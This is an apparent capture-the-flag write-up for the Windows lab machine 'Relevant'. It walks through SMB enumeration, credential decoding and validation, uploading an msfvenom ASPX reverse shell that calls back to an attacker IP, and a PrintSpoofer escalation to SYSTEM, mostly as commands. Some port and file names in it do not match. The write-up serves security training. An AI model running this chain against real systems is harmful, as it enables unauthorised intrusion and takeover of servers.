# **Relevant**

## **1. Reconnaissance**

The engagement began with a full port scan of the target using Nmap:
```bash
nmap -sC -sV -p- <ip_address>
```
The scan revealed:
* **Port 445 (SMB)** — Windows Server 2016 Standard Evaluation
* **Port 80 (HTTP)** — Microsoft IIS web server
* **Port 49663 (HTTP)** — Another IIS web service instance
* Several other Windows RPC-related ports
From this, SMB immediately stood out as a primary attack vector.

## **2. Anonymous SMB Enumeration**

I attempted to list SMB shares without authentication:
```bash
smbclient -L \\\\<ip_address>\\ -N
```
The share **nt4wrksv** was accessible anonymously. Connecting to it using:
```bash
smbclient \\\\<ip_address>\\nt4wrksv -N
```
Inside, I found a file named **passwords.txt** and downloaded it:
```bash
get passwords.txt
```

## **3. Credential Extraction**

Examining `passwords.txt` revealed a base64-encoded string. Decoding it:
```bash
echo "<base64string>" | base64 -d
```
This produced two sets of credentials:
* **Bill** → `Juw4nnaM4n420696969!$$$`
* **Bob** → `!P@$$W0rD#123`

## **4. Credential Validation**

I validated the credentials against SMB:
```bash
crackmapexec smb <ip_address> -u Bill -p 'Juw4nnaM4n420696969!$$$'
crackmapexec smb <ip_address> -u Bob -p '!P@$$W0rD#123'
```
**Result:**
* Bill’s credentials were **valid**
* Bob’s credentials were **invalid**

## **5. Authenticated Share Enumeration**
With Bill’s credentials, I enumerated shares:
```bash
crackmapexec smb <ip_address> -u Bill -p 'Juw4nnaM4n420696969!$$$' --shares
```
Findings:
* **nt4wrksv** → Read/Write access
* ADMIN\$, C\$ → No access
* IPC\$ → Read only
This confirmed we could upload files to **nt4wrksv**.

## **6. Attempts to Locate Physical Share Mapping (Failed)**

To identify where **nt4wrksv** was mapped on the filesystem, I tried:
```bash
enum4linux -S -u Bill -p 'Juw4nnaM4n420696969!$$$' <ip_address>
smbmap -H <ip_address> -u Bill -p 'Juw4nnaM4n420696969!$$$' -r nt4wrksv
```
Both failed to reveal any useful path mapping information. This meant we didn’t know whether the share was tied to the webserver.

## **7. Remote Execution Attempts (Failed)**

I attempted various direct remote execution methods with Bill’s credentials:
* **RDP** with `rdesktop` → Failed due to CredSSP/NLA configuration issues.
* **RDP** with `xfreerdp` → Certificate mismatch & authentication errors.
* **impacket-wmiexec** → Failed with `Unknown DCE RPC fault`.
* **impacket-psexec** → Authenticated only as Guest.
All these methods failed to provide shell access.

## **8. Discovery of Web-Accessible Uploads (Success)**

While exploring further, I discovered that files uploaded to **nt4wrksv** were accessible via the webserver running on **port 49663**.
For example, after uploading a `test.txt` file, it was accessible at:
```
http://<ip_address>:49663/nt4wrksv/test.txt
```
This confirmed that **nt4wrksv** was mapped to an IIS-served directory.

## **9. Webshell Upload & Execution (Success)**

With confirmed web access, I prepared an **ASPX reverse shell** for Netcat:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.110.209 LPORT=1309 -f aspx > shell.aspx
```
Uploaded the shell:
```bash
smbclient //<ip_address>/nt4wrksv -U 'Bill%Juw4nnaM4n420696969!$$$' -c "put revshell.aspx"
```
Started a listener:
```bash
nc -lvnp 4444
```
Triggered the shell by browsing to:
```
http://<ip_address>:49663/nt4wrksv/revshell.aspx
```
A reverse shell connection was established successfully.

## **10. User Flag Retrieval (Success)**

From the shell, I navigated to the user’s Desktop directory and retrieved the flag:
```cmd
dir C:\Users
type C:\Users\Bob\Desktop\user.txt
```
Flag successfully obtained.

## **11. Privilege Escalation Enumeration**

Now in the IIS shell, I checked the current user privileges:
```cmd
  whoami /priv
```
Found `SeImpersonatePrivilege` enabled which is vulnerable to **Token Impersonation**. So, I located the physical path of the writable share:
```cmd
  dir c:\inetpub\wwwroot\nt4wrksv
```
Verified that uploaded files were present there.

## **12. Downloading and Uploading PrintSpoofer**

Download a trusted PrintSpoofer binary locally:
```bash
  wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
```
Uploaded it to the writable share:
```bash
  smbclient //<ip_address>/nt4wrksv -U 'Bill%Juw4nnaM4n420696969!$$$' -c "put PrintSpoofer.exe"
```

## **13. Executing PrintSpoofer to Gain SYSTEM**

From the IIS shell, I navigated to the uploaded binary location:
```cmd
  cd c:\inetpub\wwwroot\nt4wrksv
```
Ran PrintSpoofer to spawn a SYSTEM shell:
```cmd
  PrintSpoofer.exe -i -c cmd
```
Confirmed elevated privileges using `whoami` which will show `nt authority\system`.

## **14. Retrieving the Administrator Flag**

Navigated to the Administrator’s desktop and then retrieve the admin flag:
```cmd
  cd C:\Users\Administrator\Desktop
  type root.txt
```

---
